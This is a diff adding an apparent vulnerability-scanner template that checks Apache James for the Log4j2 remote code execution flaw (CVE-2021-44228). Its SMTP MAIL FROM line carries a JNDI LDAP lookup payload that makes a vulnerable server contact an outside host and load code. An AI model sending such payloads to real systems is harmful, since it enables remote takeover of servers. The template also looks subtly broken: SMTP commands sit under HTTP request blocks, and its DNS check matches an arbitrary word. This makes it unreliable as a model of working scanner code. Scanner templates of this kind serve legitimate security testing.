@@ -1,0 +1,64 @@
+id: apache-james-log4j2-rce
+info:
+  name: Apache James Log4j2 Command Execution (CVE-2021-44228)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Apache James uses log4j2, which has a command execution vulnerability. Attackers can execute arbitrary code on the server, potentially gaining full control.
+  reference:
+    - https://james.apache.org/
+    - https://github.com/apache/logging-log4j2
+  classification:
+    cve-id: CVE-2021-44228
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 10.0
+
+dns:
+  - name: resolve-check-url
+    type: A
+    class: inet
+    retries: 3
+    matchers:
+      - type: word
+        words:
+          - "valid"
+    extractors:
+      - type: regex
+        regex:
+          - "^[0-9a-f]{4}\\.[a-z0-9.-]+"
+        internal: true
+
+http:
+  - raw:
+      - |
+        EHLO mail.txt
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "PIPELINING"
+          - "ENHANCEDSTATUSCODES"
+          - "8BITMIME"
+
+  - raw:
+      - |
+        MAIL FROM:<${jndi:ldap://{{dns_resolve_check_url}}}>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "2.1.0 Ok"
+
+  - raw:
+      - |
+        QUIT
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "^[0-9]{3}\\s.*"
+
+    stop-at-first-match: true
